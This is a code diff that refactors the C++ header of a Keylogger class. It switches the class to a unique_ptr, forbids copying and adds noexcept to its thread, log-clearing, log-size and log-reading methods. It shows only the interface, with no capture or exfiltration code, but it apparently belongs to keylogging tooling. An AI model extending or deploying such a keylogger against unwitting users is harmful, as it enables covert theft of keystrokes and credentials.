@@ -2,6 +2,7 @@
 
 #include <string>
 #include <vector>
+#include <memory>
 
 #include "methods/keylogger/IKeyloggerImplementation.h"
 
@@ -20,35 +21,40 @@ namespace keylogger
 class Keylogger
 {
 public:
-    Keylogger(IKeyloggerImplementation *implementation);
+    Keylogger(IKeyloggerImplementation *implementation)
+        : m_threadRunning(false),
+          m_implementation(std::unique_ptr<IKeyloggerImplementation>(implementation))
+    {}
     virtual ~Keylogger();
 
-    /**
-      * Copy constructor steals m_implementation from copied object.
-      */
-    Keylogger(Keylogger& other);
+    // Copy is forbidden
+    Keylogger(const Keylogger& other)            = delete;
+    Keylogger& operator=(const Keylogger& other) = delete;
+
+    Keylogger(Keylogger&& other)                 = default;
+    Keylogger& operator=(Keylogger&& other) = delete;
 
     /**
       * This functions starts the logging thread.
       */
-    void StartThread();
+    void StartThread() noexcept;
 
     /**
       * This functions stops the logging thread.
       */
-    void StopThread();
+    void StopThread() noexcept;
 
     /**
       * This functions clears the log file.
       */
-    void ClearLog();
+    void ClearLog() noexcept;
 
     /**
       * Use this function to get the log file's size
       * in bytes.
       * @return size of log file in bytes
       */
-    uint32_t LogSize();
+    uint32_t LogSize() noexcept;
 
     /**
       * Use this function to get the log file's content.
@@ -57,7 +63,8 @@ public:
       * @return number of bytes copied to buffer.
       */
     uint32_t GetLog(char *buffer,
-                    uint32_t buffer_len);
+                    uint32_t buffer_len)
+     noexcept;
 
 protected:
 
@@ -75,7 +82,7 @@ protected:
 
 private:
 
-    IKeyloggerImplementation *m_implementation;
+    std::unique_ptr<IKeyloggerImplementation> m_implementation;
 
     /**
       * This function logs keystrokes while m_threadRunning
@@ -83,7 +90,7 @@ private:
       * It sets m_threadOut true on entering,
       * and sets its value false on exit.
       */
-    void KeylogThread();
+    void KeylogThread() noexcept;
 
 };
 }
